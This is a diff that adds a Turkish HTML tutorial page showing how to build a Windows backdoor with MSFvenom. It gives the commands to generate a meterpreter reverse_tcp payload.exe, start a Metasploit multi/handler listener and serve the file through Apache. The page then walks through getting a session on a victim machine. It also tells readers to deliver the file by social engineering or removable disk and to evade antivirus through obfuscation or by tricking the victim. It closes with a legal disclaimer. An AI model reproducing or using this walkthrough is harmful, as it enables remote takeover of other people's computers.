@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Backdoor Nedir? Ne işe yarar?</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            color: #d3d3d3;
+            background-color: rgba(0, 0, 0, 0.7);
+        }
+        h1 {
+            color: #b0b0b0;
+        }
+    </style>
+</head>
+<body>
+     <h1>MSFvenom ile Backdoor Geliştirme</h1>
+   <p><strong> MSFvenom </strong> , <strong> Metasploit framework </strong> '&uuml;n bir par&ccedil;ası olarak, backdoor (arka kapı) oluşturmak i&ccedil;in kullanılan &ccedil;ok y&ouml;nl&uuml; bir ara&ccedil;tır.</p>
+<p>İlk olarak, bir <strong> payload (zararlı kod) </strong> oluşturmanız gerekecek.MSFvenom ile kullanılabilecek t&uuml;m payload'ların listesini g&ouml;rmek i&ccedil;in aşağıdaki komutu kullanabilirsiniz: <span style="text-decoration: underline;"> <em> </em> </span></p>
+<p style="text-align: center;"><span style="color: #ff0000;"> <em> msfvenom -l payloads </em> </span></p>
+<p style="text-align: center;"><img src="https://i.imgur.com/0qtqvfc.png" alt="" width="623" height="339" /></p>
+<p>G&ouml;rselde g&ouml;r&uuml;ld&uuml;ğ&uuml; &uuml;zere 1471 adet payload var. Biz şu anlık bunlardan yaygın olan <strong> Windows i&ccedil;in bir reverse shell (ters bağlantı) </strong> payload'ını kullanacağız.</p>
+<h4>1. Payload Oluşturma:</h4>
+<p>Kullanacağımız kod;</p>
+<p style="text-align: center;"><span style="color: #ff0000;"><em>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;sizin IP adresiniz&gt; LPORT=&lt;kullanmak istediğiniz port&gt; -f exe &gt; payload.exe</em></span></p>
+<p style="text-align: left;">şeklinde olmalıdır.</p>
+<p style="text-align: left;"></p>
+<ul>
+<li><code>-p</code>: Kullanılacak payload'u belirtir. Bu &ouml;rnekte, <code>windows/meterpreter/reverse_tcp</code> ters TCP bağlantısı i&ccedil;in kullanılır.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>
+<li><code>LHOST</code>: Hedefin geri bağlantı yapacağı sizin yerel IP adresiniz."ifconfig" komutuyla &ouml;ğrenebilirsiniz.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</li>
+<li><code>LPORT</code>: Hedefin bağlantı yapacağı port numarası.A&ccedil;ık portlardan herhangi birisi.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>
+<li><code>-f exe</code>: &Ccedil;ıktı dosyasının formatını belirtir. Bu &ouml;rnekte <code>exe</code> formatı, Windows &ccedil;alıştırılabilir dosyası i&ccedil;indir.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>
+<li><code>&gt; payload.exe</code>: Payload'un kaydedileceği dosya adını belirtir.</li>
+</ul>
+<p><img src="https://i.imgur.com/YP2aNpo.png" alt="" width="628" height="127" style="display: block; margin-left: auto; margin-right: auto;" /></p>
+<h4>2. Metasploit ile Dinleme:</h4>
+<p>Payload'u oluşturduktan sonra, Metasploit &uuml;zerinde bir listener ayarlamanız gerekecek. Aşşağıdaki kodu yazalım.</p>
+<p style="text-align: center;"><span style="color: #ff0000;"><em>msfconsole</em></span></p>
+<p><img src="https://i.imgur.com/OkLpzkG.png" width="289" height="452" style="display: block; margin-left: auto; margin-right: auto;" /></p>
+<p>Sonrasında aşşağıdaki g&ouml;rseldeki gibi ilk olarak gireceğimiz;</p>
+<p style="text-align: center;"><span style="color: #ff0000;"><em>"use exploit/multi/handler"</em></span></p>
+<p>komutu&nbsp;ters bağlantıyı kabul etmek i&ccedil;in kullanılan handler'ı y&uuml;kler.Ondan sonra gelen;</p>
+<p style="text-align: center;"><span style="color: #ff0000;"><em>"set payload&nbsp; windows/meterpreter/reverse_tcp"&nbsp;</em></span></p>
+<p>komutu ile payloadımızı se&ccedil;iyoruz.</p>
+<p style="text-align: center;"><span style="color: #ff0000;"><em>"set LHOST VE LPORT "</em></span></p>
+<p>kısımlarında ise girdiğimiz ip ve port değerlerini giriyoruz.</p>
+<p style="text-align: center;"><span style="color: #ff0000;"><em>"exploit" </em></span></p>
+<p>diyerek ise dinlemeye başlıyoruz.</p>
+<p></p>
+<p>&nbsp;<img src="https://i.imgur.com/Blx6ELP.png" style="display: block; margin-left: auto; margin-right: auto;" /></p>
+<p>Oluşturduğumuz payload.exe dosyası hangi konumda kodu &ccedil;alıştırdıysak o konuma kaydedilir. Biz root klas&ouml;r&uuml;nde &ccedil;alıştırdığımız i&ccedil;in orda.&nbsp;</p>
+<p>Bundan sonra yapmamız gereken hedef cihaza bu dosyayı bir şekilde ulaştırıp orda &ccedil;alıştırmak. (Sosyal m&uuml;hendislik,taşınabilir disk yardımı vs.)</p>
+<p>Biz eğitim i&ccedil;in uyguladığımız ve sizlere nasıl &ccedil;alıştığını g&ouml;stermek i&ccedil;in ş&ouml;yle bir yol izleyeceğiz.</p>
+<p>İlk olarak oluşturduğumuz dosyayı "/var/www/html/backdoor" klas&ouml;r&uuml;ne atalım. (Ben backdoor klas&ouml;r&uuml;n&uuml; kendim oluşturdum karışıklık olmasın diye.)</p>
+<p>Attıktan sonra yeni bir terminal a&ccedil;ıp</p>
+<p style="text-align: center;"><span style="color: #ff0000;"><em>"sudo systemctl start apache2"</em></span></p>
+<p>komutunu &ccedil;alıştırarak apache servisini başlatıyoruz. Apache&nbsp;a&ccedil;ık kaynaklı ve platformlar arası &ccedil;alışan bir web sunucusudur.&nbsp;Kali Linux'ta Apache'yi başlattığımızda, Kali makinemiz bir web sunucusu haline gelir. Bu sunucuya yerleştirdiğimiz herhangi bir web i&ccedil;eriği (&ouml;rneğin, HTML sayfaları, PHP dosyaları, exploit veya payload dosyaları) diğer cihazlar tarafından erişilebilir hale gelir. Windows'tan Kali'nin IP adresini girerek bu i&ccedil;eriklere ulaşabiliriz.</p>
+<p>Servisi başlattıktan sonra windows sanal makinemize gidip kendi ip adresimizi aratarak sunucuya erişmemiz lazım.Ben backdoor dosyası i&ccedil;ine koyduğumdan dolayı <span style="color: #ff0000;"><em>"ipadresim/backdoor"</em></span> yazarak dosyaya erişip indiriyorum.&nbsp;</p>
+<p><img src="https://i.imgur.com/Dpk40sd.png" width="501" height="487" style="display: block; margin-left: auto; margin-right: auto;" /></p>
+<p>Bu noktada dikkat etmemiz gereken Windows'ta g&uuml;venlik duvarını ve tam zamanlı kormayı devre dışı bırakmamız lazım &ccedil;alıştırmak i&ccedil;in.</p>
+<p>Burada "Peki kurban kişinin antivir&uuml;s&uuml; a&ccedil;ık ve kapatmazsa ne yapıcaz?" sorusunu sorabilirsiniz. Payloadı "Obfuscation" y&ouml;ntemiyle gizleme,custom payload kullanma veya sosyal m&uuml;hendislik becerileriyle antivir&uuml;s&uuml; karşı tarafa kapattırabilirsiniz.</p>
+<p>İndirdikten sonra .exe dosyamızı &ccedil;alıştırdığımız an terminalde;&nbsp;</p>
+<p><img src="https://i.imgur.com/I7w5faR.png" width="547" height="86" style="display: block; margin-left: auto; margin-right: auto;" /></p>
+<p>sessionlar &ouml;n&uuml;m&uuml;ze d&uuml;şt&uuml; şimdi onlara bakalım. "<em><span style="color: #ff0000;">sessions -1</span></em>" yazarak erişimi sağladık. "ls" &ccedil;alıştırarak dosyalara ulaştık. Artık sistemin i&ccedil;indeyiz. Gerisi size kalmış.</p>
+<p><img src="https://i.imgur.com/b6PmQ5H.png" width="620" height="440" style="display: block; margin-left: auto; margin-right: auto;" /></p>
+<h3></h3>
+<h3>&Ouml;nemli Not:</h3>
+<p><span style="text-align: center; color: #0000ff;"><strong><em>Bu tekniklerin hepsi, yalnızca yasal ve etik ama&ccedil;larla, yani izniniz olan sistemlerde kullanılmalıdır. İzniniz olmayan sistemlerde bu t&uuml;r teknikleri kullanmak yasalara aykırıdır ve ciddi hukuki sonu&ccedil;lara yol a&ccedil;abilir.</em></strong></span></p>
+<p style="text-align: center;"><strong>Okuduğunuz i&ccedil;in teşekk&uuml;rler.</strong></p>
+     
+</body>
+</html>
